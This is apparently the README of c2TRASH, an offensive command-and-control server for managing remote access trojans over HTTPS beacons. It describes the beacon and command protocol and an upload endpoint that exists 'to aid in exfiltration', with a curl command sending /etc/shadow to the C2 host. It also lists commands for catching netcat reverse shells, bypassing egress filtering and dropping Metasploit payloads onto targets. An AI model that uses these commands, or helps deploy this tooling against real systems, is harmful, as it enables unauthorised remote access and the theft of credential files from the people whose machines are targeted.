c2TRASH - C2 Tool for Remote Access Shells (Hopefully)
======
**c2TRASH** is a simple HTTPS beaconing C2 server that can manage RATs that follow the c2TRASH protocol
## The Protocol

HTTPS with JSON payloads

### Beacons

Something like (example writen in python)

```
{
        "usr":getpass.getuser(),
        "hostname":socket.gethostname(),
        "cwd": os.getcwd(),
        "time": time.time(),
        "beacon":True
}
```

### Command Payloads

Something like

```
{
    "ls":"-al"
}

```

or 
```
{
    "download":"/etc/passwd"
}
```

## Features

### Static File Server

Files stored in `<install-dir>/static` can be downloaded from https://<ip>:<port>/filename

### Upload Endpoint

File uploads are accepted to aid in exfiltration. This is used by the `download` c2TRASH command, but can be invoked directly:

Example:

```
curl -k -F '/etc/shadow=@/etc/shadow' https://<c2TRASH>/upload.php
```

### Flexible shells

Shell primitives are stored in `<install-dir>/shell` and are custimized when thrown to contain the current LHOST and LPORT values.

These shells can be customized or added to at runtime without stopping the c2TRASH server.

### Shell management

Even if you aren't using \*TRASH clients, you can still use c2TRASH to manage your shells.

The `listen` `catch` commands are helpers that can be called directly to catch raw TCP shells from other tools (or netcat).

c2TRASH uses iptables and tmux shenanigans to multiplex an arbitrary number of these raw shells over the the external port [to bypass egress filtering] on the c2TRASH server.

e.g. You can throw 100 different netcat shells to <c2TRASH>:80 and catch them all in their own new tmux session running a naive netcat listener.

### Mutiple Targets

Multiple targets can be managed by c2TRASH at the same time. Commands not recognized by c2TRASH are sent to the currently selected target to be executed. The result is a meterpreter-like shell that is A) encrypted B) beaconing (with a customizable interval that can be changed with `set beacon`)

### Supported Commands

```
Basic Commands:

set <var> <value>  -    set a configuration value on the the server
                            Example: set target 192.168.100.1
show <var>         -    show the current value of a varible
                            Example: show targets
options            -    show the options that are safe to set
switch             -    set target to the most recent target (or the first target)
host-shell         -    spawn a new tmux session on the c2 host
clear              -    clear the screen
upload <file>      -    upload a file to the target
                            Example: upload /path/to/malware/bad.exe
download <file>    -    upload a file to the target
                            Example: download /etc/passwd
shell <file>       -    send the file (which contains shell commands) to the target to be executed.
                        also, prepare to catch a shell from the target in response to the commands
listen             -    interactive command to set up a naive listener
catch <RHOST> [handler_cmd] -   low level command to set up shell listeners
attach $# / $#     -    attach to the tmux session $#
sessions           -    list active tmux sessions
kill_tmux          -    kill the tmux server
kill_sessions      -    kill all tmux sessions created during this run
exit [-y]          -    exit the server safely(?)

Known Plugin Commands:
drop <msfpc-args>  -  pass MSFPC (metasploit payload creator) the args, upload file
                      to the target, execute it, and catch the shell with metasploit
```


### Stability?

Ha, no

